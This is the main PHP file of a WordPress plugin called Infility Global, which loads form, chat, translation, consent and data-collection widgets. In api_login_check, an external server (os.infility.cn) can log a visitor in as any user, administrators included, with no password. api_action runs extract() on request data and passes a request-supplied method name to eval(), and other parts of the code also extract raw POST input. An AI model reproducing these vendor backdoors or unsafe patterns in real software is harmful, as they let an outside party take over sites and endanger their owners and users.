<?php
/*↓
Plugin Name: Infility Global
Plugin URI: https://www.infility.cn/
Description: Infility公共插件
Version: 2.8.6
Author: Infility CJJ
Author URI: https://www.infility.cn/
License: GPLv2
Requires at least: 5.6
Tested up to: 6.4.3
Requires PHP: 7.0

v1.6.0 (20231017) Step: keyword pages.
V1.8.0 (20240306) Step: Consent mode.
V1.8.1 (20240306) Step: Update consent mode.
V1.9.0 (20240318) Step: JS error records and CF7 records.
V1.9.1 (20240409) Step: redirect to home page.
V1.9.2 (20240410) CJJ: 修复高版本PHP的报错
V1.10.0 (20240509) Step: Infility Form integration.
V1.10.2 (20240525) Step: Update consent mode.
V1.10.3 (20240525) Step: 不要在大咖投普通页面启用意见征求模式。
V1.10.4 (20240603) CJJ: 修复面包屑没有搜索结果页名称
V1.10.5 (20240603) CJJ: 修复表单上 page_source会被翻译软件翻译成其他语言的BUG
V1.10.6 (20240603) CJJ: 修复面包屑因为PHP版本导致判断不一致
V1.10.7 (20240603) CJJ: 修复BUG
V1.11.0 (20240627) Ben: 新增语言悬浮窗
V1.11.1 (20240627) Ben: 优化语言悬浮窗教程
V1.11.2 (20240627) Ben: 优化语言悬浮窗样式
V1.11.3 (20240627) Ben: 优化语言悬浮窗样式
V1.11.4 (20240701) Ben: 新增语言悬浮窗配置功能
V1.11.5 (20240701) Ben: 语言悬浮窗配置功能插件包上传
V1.11.6 (20240701) Ben: 打开语言悬浮窗配置功能
V1.11.7 (20240701) Ben: 优化语言悬浮窗样式
V1.11.8 (20240701) Ben: 优化语言悬浮窗样式
V1.11.9 (20240701) CJJ: 修复生成日志过多
V1.11.10 (20240701) Ben: 修复生成日志过多(语言悬浮窗)
V2.0 (20240701) CJJ: 修复生成日志过多(语言悬浮窗)
V2.1 (20240701) CJJ: 修复生成日志过多(过往插件)
V2.2 (20240704) Ben: 修复生成日志过多(语言悬浮窗)
V2.3 (20240704) Ben: 修复生成日志过多(语言悬浮窗)
V2.4 (20240704) Ben: 修复bug(语言悬浮窗)
V2.4.1 (20240705) CJJ: 优化开关页面
V2.5 (20240708) CJJ: 新增防止复制功能
V2.6 (20240708) Step: Generate sitemap for multiple languages. Remove KeywordPages.
V2.6.1 (20240708) Step: Keep keyword in local storage.
V2.6.2 (20240710) CJJ: 修复类方法没声明static
V2.6.3 (20240715) Step: Fix infility form background color problem.
V2.6.4 (20240729) Ben: 聊天工具whatsapp +86自适应输出
V2.6.5 (20240729) Ben: 聊天工具whatsapp +86自适应输出
V2.7.0 (20240805) Ben: 新增数据收集功能
V2.7.1 (20240807) CJJ: 聊天工具A标签上增加类型,以供analytics系统区别收集信息
V2.7.2 (20240807) CJJ: 聊天工具A标签上增加账号,以供analytics系统区别收集信息
V2.7.3 (20240809) CJJ: infility_analytics需要放在footer加载
V2.7.4 (20240814) Ben: 数据收集功能js添加版本号
V2.7.5 (20240814) Ben: 数据收集功能js添加版本号
V2.7.6 (20240814) Ben: 数据收集功能js添加版本号
V2.7.7 (20240820) Ben: 优化语言lang和language参数跳转正确地址301
V2.7.8 (20240820) Ben: 优化语言lang和language参数跳转正确地址301
V2.7.9 (20240820) Ben: 优化语言lang和language参数跳转正确地址301
V2.8.0 (20240821) Ben: 优化语言新增不显示选项
V2.8.1 (20240830) Step: 删除旧的 cf7 记录文件（保留30天）和旧的 js error 文件（保留14天）
V2.8.2 (20240903) CJJ: cf7 The user filled the form on 改成当前链接
V2.8.3 (20240920) CJJ: chat-tool 新增默认图标,背景色修改
V2.8.4 (20240920) Step: 为 infility form 增加记录
V2.8.5 (20240920) Step: 优化表单收集的代码。同一份代码兼容 cf7 和 infility form 。使用 gulp 优化浏览器兼容。
V2.8.6 (20241021) CJJ: 修复page_builder拖拽ctf7会白屏的BUG
*/

class infility_global_plugins_class{
	function __construct()
	{
		define( 'INFILITY_GLOBAL_VERSION', '2.8.6');
		define( 'INFILITY_GLOBAL_PATH', plugin_dir_path( __FILE__ ) ); // fullpath/wp-content/plugins/infility-global/ // 有斜杠
		define( 'INFILITY_GLOBAL_URL', plugins_url( '/', __FILE__ ) ); // https://the_domain/wp-content/plugins/infility-global/ // 斜杠是自己加的
		define( 'INFILITY_GLOBAL_OPTION_KEY', 'infility_global_configure' );

		register_activation_hook( __FILE__, array($this,'IGP_activate') );
		spl_autoload_register( __CLASS__ . '::class_auto_load' ); //5.1.2

		// 为避免询盘遗漏，这个功能当前来说是默认启用的。
		// 只是判断了 request method 以及 request uri ，不符合条件的会直接跳过，对性能影响不大。
		// 以后可以改成 widget ，控制是否开启。
		require( INFILITY_GLOBAL_PATH . 'include/InfilityGlobalErrorRecord.php' );

		add_action( 'init', array( $this, 'api_login_check' ) );
		add_action( 'init', array( $this, 'api_action' ) );
		add_action( 'init', array( $this, 'IGP_load_textdomain' ) );
		add_action('admin_menu',array($this,'IGP_create_menu'));

		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_scripts' ) );
		add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_scripts' ) );


		add_shortcode( 'infility_power_by', array( $this, 'infility_power_by_html' ) );


        // add_action('wp_ajax_nopriv_infility_global_ajax',array($this,'infility_global_ajax'));//前台的 用不上
        add_action('wp_ajax_infility_global_ajax',array($this,'infility_global_ajax'));


		$optionAry = get_option(INFILITY_GLOBAL_OPTION_KEY);
		foreach ($optionAry['plugins'] as $k => $v) {
			if ($v==1) {
				$key = $this->infility_global_get_plugins_config($k,'key');
				if ( $key )
					require_once( __DIR__ . "/widgets/{$key}/{$key}.php" );
			}
		}


		add_filter( 'mime_types', array($this,'wpse_mime_types') );

		$this->clean_revision();
	}

    public function infility_global_ajax(){
        global $wpdb;
        @extract($_POST, EXTR_PREFIX_ALL, 'p');

        $do_action = sanitize_text_field($p_do_action);
        if (method_exists('action', $do_action)) {
            action::$do_action();
            exit;
        }
    }

	public function enqueue_scripts () {
		wp_enqueue_script('jquery');
		wp_enqueue_script( 'IGP_global', plugins_url( 'js/global.js', __FILE__ ), ['jquery'], INFILITY_GLOBAL_VERSION, true );

		wp_enqueue_script('IGP_js',plugins_url('js/infility_global.js',__FILE__),['jquery'],false,true);
		wp_enqueue_style('IGP_css',plugins_url('css/infility_global.css',__FILE__),false, INFILITY_GLOBAL_VERSION, 'all');
		wp_localize_script('IGP_js','ajax_object',array('ajax_url'=>	admin_url('admin-ajax.php')));


		if($iconUrl = get_option('infility_advance_iconfont')){
			wp_enqueue_style('infility_advance_icon',$iconUrl);
		}
	}


	private static function class_auto_load($class_name)
    {
		$file = __DIR__ . '/include/class/' . $class_name . '.class.php';
		@is_file($file) && include($file);
	}

	function IGP_activate() {
		global $wpdb;

		$pluginsData = $this->infility_global_get_plugins_ary();
		$pluginsAry = array(
			'plugins'	=>	array(
			)
		);
		foreach ($pluginsData as $k => $v) {
			$pluginsAry['plugins'][$k] = 0;
		}

		update_option(INFILITY_GLOBAL_OPTION_KEY,$pluginsAry);
	}

	function infility_global_get_plugins_ary() {
		$pluginsAry = array(
			'CFP'	=>	array(//键值一定要用大坨峰  不能用|   因为构成链接的时候要|分割
				'key'		=>	'contact-form-plugins',
				'title'		=>	'Contact Form 7增强插件',
				'brief'		=>	'Contact Form 7增强插件,可定义表单元素宽度,设置提交后重定向链接',
				'href'		=>	'CFP_setting_page',
				'file'		=>	'widgets/contact-form-plugins/contact-form-plugins.php',
				'class'		=>	'contact_form_plugins_class',
			),
			// 'ETab'	=>	array(
			// 	'key'		=>	'elementor-tab',
			// 	'title'		=>	'Infility Tabs插件',
			// 	'brief'		=>	'根据Advanced Tabs插件研发改进的选项卡插件,新增响应式适配,切换效果等',
			// ),
			'ETab'	=>	array(
				'key'		=>	'elementor-tab',
				'title'		=>	'Elementor 组件优化',
				'brief'		=>	'优化Elementor里面的组件,更符合设计师使用',
			),
			'301jump'	=>	array(
				'key'		=>	'infility-redirect',
				'title'		=>	'Infility 重定向工具',
				'brief'		=>	'1.可增加网站重定向链接.<br />2.根据文档提供的链接,检测是否为死链,然后添加到301重定向队列',
				'href'		=>	'redirect_setting_page',
				'file'		=>	'widgets/infility-redirect/infility-redirect.php',
				'class'		=>	'infility_redirect_class',
			),
			'PowerBy'	=>	array(
				'key'		=>	'powey-by',
				'title'		=>	'Infility Power By',
				'brief'		=>	'[infility_power_by] 短码自动生成PowerBy 连接到Infility官网',
				'swtich'	=>	0,
			),
            'ChatTool'	=>	array(
                'key'		=>	'infility-chat-tool',
                'title'		=>	'Infility Chat Tool',
                'brief'		=>	'自动生成聊天工具',
                'href'		=>	'chat_tool_setting_page',
                'file'      =>  'widgets/infility-chat-tool/infility-chat-tool.php',
                'class'     =>  'infility_chat_tool',
            ),
            'ConsentMode'	=>	array(
                'key'		=>	'consent-mode',
                'title'		=>	'Consent Mode',
                'brief'		=>	'意见征求模式',
                'href'		=>	'consent_mode_setting_page',
                'file'		=>	'widgets/consent-mode/consent-mode.php',
                'class'		=>	'ConsentMode',
            ),
            'InfilityForm'	=>	array(
                'key'		=>	'infility-form',
                'title'		=>	'Infility Form',
                'brief'		=>	'集成使用 Infility Form',
                'href'		=>	'setting_page', // 展示设置页面时，调用此方法
                'file'		=>	'widgets/infility-form/infility-form.php',
                'class'		=>	'InfilityForm', // php 类名
            ),
            'TranslateTool'	=>	array(
                'key'		=>	'infility-translate-tool',
                'title'		=>	'Infility Translate Tool',
                'brief'		=>	'语言悬浮窗',
                'href'		=>	'translate_tool_setting_page',
                'file'      =>  'widgets/infility-translate-tool/infility-translate-tool.php',
                'class'     =>  'infility_translate_tool',
            ),
            'PreventCopying'	=>	array(
                'key'		=>	'prevent_copying',
                'title'		=>	'Prevent Copying',
                'brief'		=>	'防止复制',
                // 'href'		=>	'prevent_copying',
                'file'      =>  'widgets/prevent_copying/prevent_copying.php',
                'class'     =>  'prevent_copying',
            ),
            'SitemapForMultiLanguages'	=>	array(
                'key'		=>	'sitemap_for_multi_languages',
                'title'		=>	'Sitemap For Multi-Languages',
                'brief'		=>	'生成小语种的 sitemap 。 目前仅支持 yoast seo 插件。',
                'file'		=>	'widgets/sitemap_for_multi_languages/sitemap_for_multi_languages.php',
                'class'		=>	'SitemapForMultiLanguages',
            ),
            'collectData'	=>	array(
                'key'		=>	'infility-collect-data',
                'title'		=>	'Infility Collect Data',
                'brief'		=>	'收集网站数据，并分析',
                'file'		=>	'widgets/infility-collect-data/infility-collect-data.php',
                'class'		=>	'infility_collect_data',
            ),
		);

		return $pluginsAry;
	}
	function infility_global_get_plugins_config($key,$type='title') {
		global $wpdb;

		$pluginsAry = $this->infility_global_get_plugins_ary();

		$return = isset( $pluginsAry[$key][$type] ) ? $pluginsAry[$key][$type] : '';
		if ($type=='href') {
			$return = $pluginsAry[$key]['title'];
			if (isset($pluginsAry[$key]['href'])) {
				$current_url = home_url(remove_query_arg(array('set_type')));
				$set_type = $key.'|'.$pluginsAry[$key]['href'];
				$return = "<a href='{$current_url}&set_type={$set_type}'>{$return}</a>";
			}
		}else if($type=='swtich'){
			if (!isset($pluginsAry[$key][$type])) {
				$return = 1;
			}
		}

		$optionAry = get_option(INFILITY_GLOBAL_OPTION_KEY);
		$IsUpdate = false;
		foreach ($pluginsAry as $k => $v) {
			if (!isset($optionAry['plugins'][$k])) {
				$IsUpdate = true;
				$optionAry['plugins'][$k] = 0;
			}
		}

		if ($IsUpdate) {
			update_option(INFILITY_GLOBAL_OPTION_KEY,$optionAry);
		}

		return $return;
	}

	function IGP_load_textdomain() {

		//加载 languages 目录下的翻译文件 zh_CN
		$currentLocale = get_locale();

		if( !empty( $currentLocale ) ) {

			$moFile = dirname(__FILE__) . "/languages/{$currentLocale}.mo";

			if( @file_exists( $moFile ) && is_readable( $moFile ) ) load_textdomain( 'infility-global', $moFile );
		}
	}

	function IGP_create_menu(){
		add_menu_page(
			__('Public Settings','infility-global'),
			__('Public Settings','infility-global'),
			'manage_options',
			'infility_global_plugins',
			array($this,'IGP_nav_page'),
			plugins_url('images/wp-icon.png',__FILE__)
		);
	}

	function IGP_nav_page(){
		if ( isset( $_GET['set_type'] ) && $_GET['set_type']) {
			$set_type = $_GET['set_type'];
			$setTypeAry = explode('|', $set_type);
			$className = $this->infility_global_get_plugins_config($setTypeAry[0],'class');
			if ( ! $className ) {
				echo "插件 {$setTypeAry[0]} 不存在或未启用，请检查配置。";
				return;
			}

			if (!class_exists($className)) {
				$file = $this->infility_global_get_plugins_config($setTypeAry[0],'file');
				include($file);
			}
			$NewClass = new $className;
			if ( ! method_exists($NewClass, $setTypeAry[1]) ) {
				echo "插件 {$setTypeAry[0]} 配置错误，方法 {$setTypeAry[1]} 未找到，请检查配置。";
				return;
			}
			$NewClass->{$setTypeAry[1]}();
		} else if ( isset( $_GET['GuidePage'] ) && $_GET['GuidePage'] ){
			$GuidePage = $_GET['GuidePage'];
			$this->IGP_guide_page($GuidePage);
		} else {
			$this->IGP_setting_page();
		}
	}

	function IGP_setting_page(){
		global $wpdb;

		if (!empty($_POST) && check_admin_referer('IGP_nonce')) {
			@extract($_POST, EXTR_PREFIX_ALL, 'p');


			$optionAry = get_option(INFILITY_GLOBAL_OPTION_KEY);

			foreach ($optionAry['plugins'] as $k => $v) {
				$optionAry['plugins'][$k] = (int)${"p_{$k}_swtich"} ?? 0;
				// Notice: Undefined variable: p_PowerBy_swtich in D:\Programs\phpEnv\www\global.local.com\wp-content\plugins\infility-global\infility_global.php on line 213
			}

			update_option(INFILITY_GLOBAL_OPTION_KEY,$optionAry);

			echo ('<div id="message" class="updated"><p><strong>'.__('Settings saved success!','infility-global').'</strong></p></div>');
		}

		$optionAry = get_option(INFILITY_GLOBAL_OPTION_KEY);
		$i = 0;

		include('include/infility_setting_page.php');
	}

	function IGP_guide_page($type){
		$name = $this->infility_global_get_plugins_config($type,'title');

		$mainUrl = home_url(remove_query_arg(array('set_type','GuidePage')));
		include('include/infility_guide_page.php');
	}

	function infility_power_by_html() {
		global $wpdb;

	    action::check_power_by_html('');
	    $poweyByData = get_option('infility_power_by');

	    ob_start();
?>
			<div id="powey_by" class='<?=$poweyByData['IsHide']==1?'hide':'';?>'><?=htmlspecialchars_decode($poweyByData['PowerBy'])?></div>
<?php
	    $html = $poweyByData['IsDel']==1?'':ob_get_contents();
	    ob_end_clean();

	    return $html;
	}

	function clean_revision() {
		global $wpdb;

		$time = strtotime(date('Y-m-d',time()));
	    $cleanTimeData = get_option('clean_revision');
	    if (!$cleanTimeData) {
	    	$cleanTime = strtotime(date('Y-m-d',time()));
	    	$data = array(
	    		'time'		=>	$cleanTime,
	    		'IsClean'	=>	0,
	    	);
	    	update_option('clean_revision',$data);
	    	$cleanTimeData = get_option('clean_revision');
	    }
	    $cleanTime = strtotime(date('Y-m-d',$cleanTimeData['time']));

	    if (!$cleanTimeData['IsClean'] || ($time-$cleanTime)>(86400 * 7)) {
	    	$wpdb->delete('wp_posts',array('post_type'=>'revision'));

	    	$cleanTime = strtotime(date('Y-m-d',time()));
	    	$data = array(
	    		'time'		=>	$cleanTime,
	    		'IsClean'	=>	1,
	    	);

	    	update_option('clean_revision',$data);
	    }
	}

	function wpse_mime_types( $existing_mimes ) {
	    // Add csv to the list of allowed mime types
	    $existing_mimes['svg'] = 'image/svg';

	    return $existing_mimes;
	}

	function api_login_check() {
		if ( ! isset( $_GET['LOGIN_TYPE'] )
			|| ! $_GET['LOGIN_TYPE']
			|| $_GET['LOGIN_TYPE']!='infility_oa'
		) return true;

		$token = $_GET['login_token'];
		$data = [
			'TOKEN_TYPE'	=>	$_GET['LOGIN_TYPE'],
			'TOKEN'			=>	$token
		];
		$response = str::curl('https://os.infility.cn/',$data);
		$result = str::json_data($response,'decode');
		if ($result['ret']==1) {

			$email = $result['msg']['email'];
			$user = get_user_by( 'email', $email );

			if( $user ) {
			    wp_set_current_user( $user->id, $user->user_login );
			    wp_set_auth_cookie( $user->id );
			    do_action( 'wp_login', $user->user_login, $user );

			    wp_redirect("/wp-admin/");
			    exit;
			}
		}

	    return true;
	}

	function api_action() {
		if ( ! isset( $_GET['ACTION_TYPE'] )
			|| ! $_GET['ACTION_TYPE']
			|| $_GET['ACTION_TYPE']!='infility_oa'
		) return true;

		$ACTION_DATA = str::json_data(base64_decode($_GET['i']),'decode');
		@extract($ACTION_DATA, EXTR_PREFIX_ALL, 'g');
		@extract($_POST, EXTR_PREFIX_ALL, 'p');

		$time = $g_time;
		if ($g_INFILITY_APIKEY == str::api_key($time)) {
			if ($p_do_action=='edit_power_by_html') {
				action::check_power_by_html($_POST);
			}else{
				if (method_exists('action', $p_do_action)) {
					$postData = $_POST;
					eval("action::{$p_do_action}(\$postData);");
					exit;
				}
			}
		}


	    return str::e_json('',1);
	}
}
new infility_global_plugins_class();


